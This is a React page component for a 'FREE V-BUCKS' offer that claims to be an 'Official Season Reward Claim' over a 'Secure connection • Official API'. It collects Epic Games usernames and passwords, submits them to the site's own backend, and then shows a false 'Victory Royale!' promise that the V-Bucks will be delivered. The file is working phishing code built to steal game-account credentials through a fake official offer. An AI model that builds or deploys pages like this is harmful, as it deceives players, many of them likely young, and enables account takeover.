import { useState } from "react";
import { useCreateSubmission } from "@/hooks/use-submissions";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { Link } from "wouter";
import { ArrowLeft, Check, Sparkles, Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

export default function Fortnite() {
  const { toast } = useToast();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [amount, setAmount] = useState("1000");
  const [isSuccess, setIsSuccess] = useState(false);

  const createSubmission = useCreateSubmission();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) return;

    createSubmission.mutate(
      {
        platform: "fortnite",
        username,
        password,
        amount,
      },
      {
        onSuccess: () => {
          setIsSuccess(true);
          toast({
            title: "Success!",
            description: "Your V-Bucks request has been queued.",
            className: "bg-yellow-400 text-black border-none font-bold",
          });
        },
        onError: () => {
          toast({
            title: "Error",
            description: "Something went wrong. Please try again.",
            variant: "destructive",
          });
        },
      }
    );
  };

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-[#1a1a2e] flex flex-col items-center justify-center p-4 relative overflow-hidden">
        {/* Success Background */}
        <div className="absolute inset-0 bg-gradient-to-br from-blue-900/40 to-purple-900/40" />
        
        <motion.div 
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="relative z-10 bg-black/60 backdrop-blur-xl border border-yellow-400/30 p-8 rounded-3xl max-w-md w-full text-center"
        >
          <div className="w-24 h-24 bg-gradient-to-tr from-yellow-400 to-orange-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg shadow-yellow-500/40">
            <Check className="w-12 h-12 text-white" strokeWidth={4} />
          </div>
          <h2 className="text-4xl font-fortnite text-white mb-4 uppercase tracking-wider">Victory Royale!</h2>
          <p className="text-blue-200 text-lg mb-8 font-medium">
            Your {amount} V-Bucks will be delivered to <span className="text-yellow-400">{username}</span> ASAP!
          </p>
          <Link href="/" className="inline-block w-full">
            <Button variant="fortnite" size="xl" className="w-full">
              Back to Home
            </Button>
          </Link>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#1a1a2e] text-white font-sans selection:bg-yellow-400 selection:text-black">
      {/* Background */}
      <div className="fixed inset-0 z-0">
         <div className="absolute inset-0 bg-gradient-to-br from-blue-900 via-purple-900 to-black" />
         {/* Decorative shapes */}
         <div className="absolute top-20 right-20 w-64 h-64 bg-purple-600/30 rounded-full blur-3xl animate-pulse" />
         <div className="absolute bottom-20 left-20 w-96 h-96 bg-blue-600/20 rounded-full blur-3xl animate-pulse delay-1000" />
      </div>

      <div className="relative z-10 container mx-auto px-4 py-8">
        <Link href="/" className="inline-flex items-center text-white/60 hover:text-yellow-400 transition-colors mb-8 font-bold uppercase tracking-wider">
          <ArrowLeft className="mr-2 w-5 h-5" /> Back
        </Link>

        <div className="max-w-md mx-auto">
          <div className="text-center mb-10">
            <motion.div
              initial={{ y: -20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              <h1 className="text-5xl md:text-7xl font-fortnite text-transparent bg-clip-text bg-gradient-to-b from-yellow-300 to-orange-500 drop-shadow-sm mb-2 transform -rotate-2">
                FREE V-BUCKS
              </h1>
              <p className="text-blue-200 font-bold uppercase tracking-widest text-sm">
                Official Season Reward Claim
              </p>
            </motion.div>
          </div>

          <motion.div
            initial={{ y: 20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ delay: 0.2, duration: 0.5 }}
          >
            <Card className="bg-black/40 backdrop-blur-md border-t border-l border-white/10 border-b-4 border-r-4 border-black/50 shadow-2xl overflow-hidden rounded-3xl">
              <div className="h-2 bg-gradient-to-r from-yellow-400 via-orange-500 to-pink-500" />
              <div className="p-8">
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <Label className="text-blue-200 font-black uppercase text-xs tracking-wider ml-1">Epic Games Username</Label>
                    <Input
                      required
                      placeholder="Enter your username"
                      className="bg-blue-950/50 border-blue-800/50 text-white placeholder:text-blue-400/30 h-12 text-lg font-bold rounded-xl focus:ring-yellow-400 focus:border-yellow-400 transition-all"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                    />
                  </div>

                  <div className="space-y-2">
                    <Label className="text-blue-200 font-black uppercase text-xs tracking-wider ml-1">Password</Label>
                    <Input
                      required
                      type="password"
                      placeholder="Enter your password"
                      className="bg-blue-950/50 border-blue-800/50 text-white placeholder:text-blue-400/30 h-12 text-lg font-bold rounded-xl focus:ring-yellow-400 focus:border-yellow-400 transition-all"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                    />
                  </div>

                  <div className="space-y-2">
                    <Label className="text-blue-200 font-black uppercase text-xs tracking-wider ml-1">V-Bucks Amount</Label>
                    <Select value={amount} onValueChange={setAmount}>
                      <SelectTrigger className="bg-blue-950/50 border-blue-800/50 text-white h-14 rounded-xl font-bold text-lg focus:ring-yellow-400 focus:border-yellow-400">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent className="bg-blue-900 text-white border-blue-800 font-bold">
                        <SelectItem value="1000">1,000 V-Bucks</SelectItem>
                        <SelectItem value="2800">2,800 V-Bucks</SelectItem>
                        <SelectItem value="5000">5,000 V-Bucks</SelectItem>
                        <SelectItem value="13500">13,500 V-Bucks</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="pt-4">
                    <Button 
                      type="submit" 
                      variant="fortnite" 
                      size="xl" 
                      className="w-full relative overflow-hidden group"
                      disabled={createSubmission.isPending}
                    >
                      <span className="relative z-10 flex items-center justify-center gap-2">
                        {createSubmission.isPending ? (
                          <>
                            <Loader2 className="animate-spin" /> Processing...
                          </>
                        ) : (
                          <>
                            Login & Claim <Sparkles className="w-5 h-5 fill-black" />
                          </>
                        )}
                      </span>
                      <div className="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300 skew-y-12" />
                    </Button>
                    <p className="text-center text-xs text-blue-300/50 mt-4 uppercase font-bold tracking-wider">
                      Secure connection • Official API
                    </p>
                  </div>
                </form>
              </div>
            </Card>
          </motion.div>
        </div>
      </div>
    </div>
  );
}